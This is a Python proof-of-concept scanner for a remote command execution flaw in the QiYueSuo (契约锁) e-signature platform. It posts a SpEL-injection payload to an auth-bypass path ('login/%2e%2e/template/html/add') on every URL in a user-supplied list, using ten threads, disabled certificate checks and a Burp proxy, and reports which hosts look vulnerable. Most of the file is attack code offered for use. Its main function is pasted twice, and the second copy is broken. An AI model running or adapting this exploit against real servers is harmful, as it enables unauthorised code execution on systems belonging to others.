# Author:XiaoLong

import urllib.request
import ssl
import json
import threading
import time
from queue import Queue

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
    "Accept-Encoding": "gzip, deflate",
    "Accept": "*/*",
    "Connection": "close",
    "Content-Type": "application/json",
    "X-State": "id"
}

data = {
    "file": "1",
    "title": "2",
    "params": [
        {
            "extensionParam": "{\"expression\":\"var a=new org.springframework.expression.spel.standard.SpelExpressionParser();var b='';var b64=java.util.Base64.getDecoder();var deStr=new java.lang.String(b64.decode(b),'UTF-8');var c=a['parseExpression'](deStr);c.getValue();\"}",
            "name": "3"
        }
    ]
}


def poc(url,retry=3):
    if url.endswith("/"):
        path = "login/%2e%2e/template/html/add"
    else:
        path = "/login/%2e%2e/template/html/add"

    if not url.startswith('http://') and not url.startswith('https://'):
        url_new = 'http://' + url
    else:
        url_new = url
    encodetext = url_new + path
    
    #requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    data_str = json.dumps(data)
    data_bytes = data_str.encode('utf-8')
    
    # 禁用 SSL 证书验证
    context = ssl._create_unverified_context()
    ssl._create_default_https_context = ssl._create_unverified_context
    
    # 设置 Burp Suite 的代理地址
    proxy_handler = urllib.request.ProxyHandler({
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    })
    opener = urllib.request.build_opener(proxy_handler)
    
    #context = ssl._create_unverified_context()
    req = urllib.request.Request(url=encodetext, data=data_bytes, headers=headers, method='POST')
    try:
        
        response = opener.open(req, timeout=10)
        
        response_text = response.read().decode('utf-8')
        
        #print(response_text)
        if 'uid' in response_text and response.status == 200:
            print(url, '[+]存在契约锁add远程命令执行漏洞')
        else:
            print(url, '[-] 不存在契约锁add远程命令执行漏洞')
    except urllib.error.URLError as e:
        if retry > 0:
            print(f"请求发生异常: {str(e)}，重试中...")
            time.sleep(1)
            poc(url, retry-1)
        else:
            print(f"[-] 请求已达最大重试次数{url}不存在契约锁add远程命令执行漏洞")
    except Exception as e:
        if retry > 0:
            print(f"其他异常: {str(e)}，重试中...")
            time.sleep(1)
            poc(url, retry-1)
        else:
            print(f"[-] 请求已达最大重试次数{url}不存在契约锁add远程命令执行漏洞")
       
def worker(q):
    while not q.empty():
        url = q.get()
        if url is not None:
            poc(url)
        q.task_done()
    


#with open(input('urls:').strip(), 'r', encoding = 'utf-8')as f1:
#    for url in f1:
#        poc(url.strip())
        
def main():
    urls_file = input('请输入包含URL列表的文件名: ').strip()

    try:
        with open(urls_file, 'r', encoding='utf-8') as f1:
            urls = [url.strip() for url in f1.readlines()]
            
            q = Queue()
            for url in urls:
                q.put(url)

            threads = []
            for _ in range(10):  # 限制同时运行的线程数量为10
                t = threading.Thread(target=worker, args=(q,))
                t.start()
                threads.append(t)

            q.join()

            for t in threads:
                t.join()

    except FileNotFoundError:
        print(f"文件 {urls_file} 未找到")
    except Exception as e:
        print(f"读取文件时发生异常: {str(e)}")
    urls_file = input('请输入包含URL列表的文件名: ').strip()

    try:
        with open(urls_file, 'r', encoding='utf-8') as f1:
            urls = [url.strip() for url in f1.readlines()]
            
            threads = []
            for url in urls:
                t = threading.Thread(target=worker, args=(url,))
                threads.append(t)
                t.start()

            for t in threads:
                t.join()

    except FileNotFoundError:
        print(f"文件 {urls_file} 未找到")
    except Exception as e:
        print(f"读取文件时发生异常: {str(e)}")

if __name__ == '__main__':
    main()
